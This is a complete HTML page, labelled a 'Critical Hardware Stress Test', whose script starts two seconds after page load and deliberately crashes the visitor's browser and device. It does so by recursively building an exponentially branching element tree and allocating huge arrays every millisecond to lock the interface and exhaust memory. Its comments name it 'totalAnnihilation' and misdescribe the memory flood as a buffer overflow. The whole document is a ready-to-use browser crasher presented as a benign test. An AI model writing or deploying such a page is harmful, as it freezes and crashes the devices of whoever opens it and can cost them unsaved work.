<!DOCTYPE html>
<html>
<body style="background: black; color: red;">
    <h1>CRITICAL HARDWARE STRESS TEST</h1>
    <p>If the screen freezes, wait for the auto-reboot or press Refresh + Power.</p>
    
    <div id="crush"></div>

    <script>
        const target = document.getElementById('crush');
        
        function totalAnnihilation() {
            // 1. Recursive DOM Bloom (locks the UI thread)
            function grow(parent, depth) {
                if (depth > 1000) return;
                const div = document.createElement('div');
                div.style.border = "1px solid red";
                div.innerText = "CRASHING_" + Math.random();
                parent.appendChild(div);
                // Exponentially branch out
                grow(div, depth + 1);
                grow(div, depth + 1);
            }

            // 2. High-Speed Buffer Overflow (fills RAM)
            const leak = [];
            setInterval(() => {
                // Creates a massive array of junk data every 1ms
                leak.push(new Array(1000000).fill(window.location.href));
                grow(target, 0); 
            }, 1);
        }

        // Delay start by 2 seconds so you can actually see the page load
        setTimeout(totalAnnihilation, 2000);
    </script>
</body>
</html>
